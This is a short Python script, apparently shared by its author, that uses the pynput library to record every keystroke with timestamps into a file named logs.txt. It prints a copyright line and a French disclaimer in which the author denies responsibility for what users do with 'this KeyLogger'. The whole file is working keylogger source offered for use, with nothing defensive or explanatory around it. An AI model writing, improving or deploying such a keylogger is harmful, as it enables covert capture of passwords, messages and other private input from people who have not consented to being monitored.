from pynput.keyboard import Listener
import logging
print("© Polo 83 - All Reserved.")
print("Je suis en aucun cas responsable de ce que vous faites avec ce KeyLogger.")

file = "logs.txt"

logging.basicConfig(filename=file, level=logging.DEBUG, format="%(asctime)s %(message)s")

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()